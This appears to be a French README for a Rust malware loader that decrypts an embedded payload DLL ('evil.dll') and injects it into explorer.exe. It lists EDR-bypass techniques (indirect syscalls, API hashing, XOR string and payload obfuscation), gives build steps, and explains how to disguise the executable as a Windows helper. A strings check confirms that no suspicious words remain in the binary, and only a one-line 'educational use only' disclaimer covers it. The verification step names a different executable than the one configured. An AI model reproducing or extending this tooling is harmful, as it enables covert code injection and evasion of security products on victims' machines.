# Reflective DLL Loader - Rust

## Compilation

```bash
# Prerequis (une seule fois)
rustup target add x86_64-pc-windows-gnu

# Build
cargo build --release --target x86_64-pc-windows-gnu
```

Binaire genere : `target/x86_64-pc-windows-gnu/release/WindowsHelper.exe`

## Techniques implementees

| Technique | Description |
|-----------|-------------|
| Indirect Syscalls | Bypass hooks EDR via jump dans ntdll |
| DLL Chiffree (XOR) | Payload invisible a l'analyse statique |
| String Obfuscation | `obf_str!` macro - XOR compile-time |
| API Hashing | `obf!` macro - DJB2 compile-time |
| PE Parsing | Trouve l'export ReflectiveLoader |
| RW -> RX | Pas d'allocation RWX suspecte |
| Minimum Rights | `0x002A` au lieu de `PROCESS_ALL_ACCESS` |

## Flow d'injection

```
build.rs: evil.dll --XOR--> evil.dll.enc (compile-time)
                              |
main.rs:                      v
  1. Dechiffre DLL en memoire (runtime)
  2. Parse PE -> trouve ReflectiveLoader offset
  3. Enumere processus -> explorer.exe
  4. NtOpenProcess (droits minimum)
  5. NtAllocateVirtualMemory (RW)
  6. NtWriteVirtualMemory (copie DLL)
  7. NtProtectVirtualMemory (RW -> RX)
  8. NtCreateThreadEx (demarre ReflectiveLoader)
  9. NtClose (cleanup)
```

## Structure

```
loader_rust/
├── build.rs                # Chiffre evil.dll au compile-time
├── Cargo.toml              # Config + nom executable
├── src/
│   ├── main.rs             # Loader principal
│   └── syscalls/
│       ├── mod.rs
│       ├── obf.rs          # Macros obf! et obf_str!
│       ├── resolve.rs      # Resolution SSN via PEB
│       └── syscall.rs      # Stub syscall x64
└── README.md
```

## Configuration

Changer le nom de l'executable dans `Cargo.toml` :
```toml
[[bin]]
name = "WindowsHelper"  # -> WindowsHelper.exe
path = "src/main.rs"
```

Changer la cle XOR dans `build.rs` ET `src/main.rs` :
```rust
const XOR_KEY: &[u8] = b"VotreCleIci!1234";
```

## Verification

```bash
# Aucune string suspecte dans le binaire
strings WinUpdateHelper.exe | grep -iE "(Reflective|explorer|evil)"
# -> rien
```

## Disclaimer

Usage educatif uniquement.
